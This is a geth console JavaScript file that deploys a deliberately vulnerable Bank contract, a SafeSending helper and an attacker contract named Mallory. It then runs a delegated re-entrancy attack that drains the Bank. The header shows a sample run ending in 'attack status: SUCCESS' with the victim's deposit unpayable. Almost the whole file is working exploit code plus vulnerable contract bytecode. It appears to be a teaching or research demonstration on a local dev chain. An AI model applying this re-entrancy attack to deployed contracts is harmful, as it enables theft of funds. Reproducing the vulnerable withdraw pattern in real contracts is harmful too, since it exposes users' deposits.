// Script for deploying and running a delegated re-entrancy attack against a
// crafted vulnerable contract (see delegated.sol)
//
// usage:
// first start geth in developer mode (no mining difficulty and prefundend
// accounts) and start the JavaScript console interface of geth:
//
// $ geth --dev --dev.period=1 console
//
// Then load this script to setup everything:
//
// > loadScript("delegated_setup.js")
//
// Sometimes it takes a while for all contracts to be mined and commited to the
// dev blockchain. Manually creating more transactions helps. Simply type:
//
// > transferSomething()
//
// If both the Token and Mallory contracts have been mined, the attack can be
// started:
//
// > triggerAttack()
//
//
// Example:
//
// > loadScript("./delegated_setup.js")
//
// === Delegated Re-Entrancy Attack Example ===
//
// prefunded balance: 1.15792089237316195423570985008687907853269984665640564039457584007913129639927e+77
// transferring initial funds to attacker account
// attacker account balance: 1000000000000
// [+] creating contracts
// new Safesending
// null [object Object]
// new Mallory
// null [object Object]
//
// ===============================================================================
// Wait for SafeSending, Bank and Mallory contracts to be mined.
// Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that the SafeSending, Mallory and Bank contract are mined.
//
// Use `triggerAttack()` to start the attack.
// ===============================================================================
//
// true
// > null [object Object]
// SafeSending mined! address: 0x536aecf182f3f59fa39ad72a34f1ccae88cb6dcd transactionHash: 0x3771a89860a8774fdb7a35a0fd9a3572125eae221436ff0a6753789b8db384f6
// new Bank
// null [object Object]
// null [object Object]
// Mallory Contract mined! address: 0x9d413eb04de05280782da6701ccbbf020ecf7b82 transactionHash: 0xa8f95da16b2ebd38739f00de6f4c550247ec1dd3a375ee692971246b434468ff
// null [object Object]
// Bank mined! address: 0xbb8cebebbfedf7aa2a9fffda049b106cc8850506 transactionHash: 0x938c116b897149e3e89be7d2ca98b11613ad2dec5b9eb5f2d846599174861d5b
//
// >
// > transferSomething()
// undefined
// >
// > t = triggerAttack()
// [+] setting up contracts for attack
//
// [+] Current status:
// Mallory has 100000 wei
// Bank    has 200000 wei
// Mallory has 100000 wei deposited in Bank
// victim  has 100000 wei deposited in Bank
//
// [+] Triggering attack by sending wei to Mallory, which calls fallback
// [+] Executed attack...
//
// [+] Current status:
// Mallory has 300000 wei
// Bank    has 0 wei
// Mallory has 1.15792089237316195423570985008687907853269984665640564039457584007913129539936e+77 wei deposited in Bank
// victim  has 100000 wei deposited in Bank
// Warning: bank doesn't have enough ether to give back victim's money
//
// Mallory gained 200000 wei
// attack status: SUCCESS
//


console.log("\n=== Delegated Re-Entrancy Attack Example ===\n")


var defaultPassword = "";

personal.newAccount(defaultPassword)
personal.newAccount(defaultPassword)
function unlockAllAccounts() {
  // this is the prefundend dev contract
  personal.unlockAccount(eth.accounts[0], defaultPassword)
  // we'll use this as "attacker"
  personal.unlockAccount(eth.accounts[1], defaultPassword)
}
unlockAllAccounts()

console.log("prefunded balance: " + eth.getBalance(eth.accounts[0]))
console.log("transferring initial funds to attacker account")
eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[1], value: 1000000000000})
admin.sleepBlocks(3)
console.log("attacker account balance: " + eth.getBalance(eth.accounts[1]))

function transferSomething() { // just transfer something to make geth commit the next block
	eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[2], value: 100})
  admin.sleepBlocks(1)
}

transferSomething()

var safesendingContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"send","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]);
var safesender_create = {
	from: web3.eth.accounts[0],
	data: '0x61014e610030600b82828239805160001a6073146000811461002057610022565bfe5b5030600052607381538281f3fe7300000000000000000000000000000000000000003014608060405260043610610058576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063d0679d341461005d575b600080fd5b81801561006957600080fd5b506100b66004803603604081101561008057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100b8565b005b8173ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610116576040519150601f19603f3d011682016040523d82523d6000602084013e61011b565b606091505b505050505056fea165627a7a72305820a4ed4bae1f7fe4d4f55ce268f61ad9542cae68b6263f4dc643a0749bd1b692930029',
	gas: '4700000'
};

var bankContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_new","type":"address"}],"name":"updateSafeSender","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_safesender","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]);
var bank_create = {
	from: web3.eth.accounts[0],
	data: '0x608060405234801561001057600080fd5b506040516020806106918339810180604052602081101561003057600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506105be806100d36000396000f3fe60806040526004361061006c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062362a951461007157806327e235e3146100b55780632e1a7d4d1461011a578063db0fb10714610155578063f8b2cb4f146101a6575b600080fd5b6100b36004803603602081101561008757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061020b565b005b3480156100c157600080fd5b50610104600480360360208110156100d857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061025a565b6040518082815260200191505060405180910390f35b34801561012657600080fd5b506101536004803603602081101561013d57600080fd5b8101908080359060200190929190505050610272565b005b34801561016157600080fd5b506101a46004803603602081101561017857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610313565b005b3480156101b257600080fd5b506101f5600480360360208110156101c957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506103ae565b6040518082815260200191505060405180910390f35b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515610310576102c333826103f6565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103ab5780600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168282604051602401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506040516020818303038152906040527fd0679d34000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831015156105265780518252602082019150602081019050602083039250610501565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610586576040519150601f19603f3d011682016040523d82523d6000602084013e61058b565b606091505b505050505056fea165627a7a72305820c4968739ab57c1abbb9755d50433740926c2fa8e488f3bb47612cbb6d515fda60029',
	gas: '4700000'
};

var malloryContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"addr","type":"address"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"victim","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"addr","type":"address"}],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var mallory_create = {
	from: web3.eth.accounts[1],
	data: '0x608060405234801561001057600080fd5b506106a0806100206000396000f3fe608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806351cff8d914610213578063930c200314610264578063d018db3e146102bb578063ed88c68e146102ff575b6000600154141561021157600180819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561016b57600080fd5b505afa15801561017f573d6000803e3d6000fd5b505050506040513d602081101561019557600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b505050505b005b34801561021f57600080fd5b506102626004803603602081101561023657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610309565b005b34801561027057600080fd5b50610279610466565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6102fd600480360360208110156102d157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061048b565b005b610307610672565b005b8073ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d8273ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156103be57600080fd5b505afa1580156103d2573d6000803e3d6000fd5b505050506040513d60208110156103e857600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561044b57600080fd5b505af115801561045f573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006001819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156105ca57600080fd5b505afa1580156105de573d6000803e3d6000fd5b505050506040513d60208110156105f457600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561065757600080fd5b505af115801561066b573d6000803e3d6000fd5b5050505050565b56fea165627a7a723058205f9c69d7e9daf8dbf99f86708fc73c7ee4cdf8a6b024109fef7437ac93e0cff30029',
	gas: '4700000'
};

var mallory;
var bank;



console.log("[+] creating contracts")
console.log("new Safesending")
var safesending = safesendingContract.new(
	safesender_create,
	function (e, contract) {
		console.log(e, contract);
		if (typeof contract.address !== 'undefined') {
			console.log('SafeSending mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
      console.log("new Bank")
			bank = bankContract.new(
				contract.address,
				bank_create,
				function (e, contract) {
					console.log(e, contract);
					if (typeof contract.address !== 'undefined') {
						console.log('Bank mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
					}
				}
			)
		}
	}
)

console.log("new Mallory")
var mallory = malloryContract.new(
	mallory_create, function (e, contract){
		console.log(e, contract);
		if (typeof contract.address !== 'undefined') {
			console.log('Mallory Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
		}
	})


transferSomething()
console.log("\n===============================================================================")
console.log("Wait for SafeSending, Bank and Mallory contracts to be mined.")
console.log("Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that the SafeSending, Mallory and Bank contract are mined.")
console.log("\nUse `triggerAttack()` to start the attack.")
console.log("===============================================================================\n")


// set up initial state, s.t. the attack is possible
function donateInitial() {
	console.log("[+] setting up contracts for attack");
	// first to some poor account, whos funds will be drained by the attacker
	bank.donate(eth.accounts[0], {from: eth.accounts[0], value: 100000});
	// and some inital funds for the attack contract
	bank.donate(mallory.address, {from: eth.accounts[1], value: 100000});
  mallory.donate({from: eth.accounts[1], value: 100000})
  admin.sleepBlocks(1)
}

// print balances of the contracts
function printStatus() {
  console.log("")
  console.log("[+] Current status:")
	console.log("Mallory has " + eth.getBalance(mallory.address) + " wei")
	console.log("Bank    has " + eth.getBalance(bank.address) + " wei")
	console.log("Mallory has " + bank.getBalance(mallory.address) + " wei deposited in Bank")
  console.log("victim  has " + bank.getBalance(eth.accounts[0]) + " wei deposited in Bank")
  if (eth.getBalance(bank.address) < bank.getBalance(eth.accounts[0])) {
    console.log("Warning: bank doesn't have enough ether to give back victim's money")
  }
  console.log("")
}

// perform attack
function triggerAttack() {
	transferSomething();
	donateInitial();
	transferSomething();

  var preBalance = eth.getBalance(mallory.address)
  printStatus()
  admin.sleepBlocks(1)

	console.log("[+] Triggering attack by sending wei to Mallory, which calls fallback")
	var t = mallory.attack(bank.address, {from: eth.accounts[1], gas: '4700000'})

  console.log("[+] Executed attack...")
  transferSomething()
  admin.sleepBlocks(3)
  printStatus()
  var gains = (eth.getBalance(mallory.address) - preBalance);
  console.log("Mallory gained " + gains + " wei");
  if (gains > 0) {
    console.log("attack status: SUCCESS");
  } else {
    console.log("attack status: FAILED");
  }

	return t;
}


function getAttackTrace() {
	a = triggerAttack();
	return debug.traceTransaction(a);
}

transferSomething()
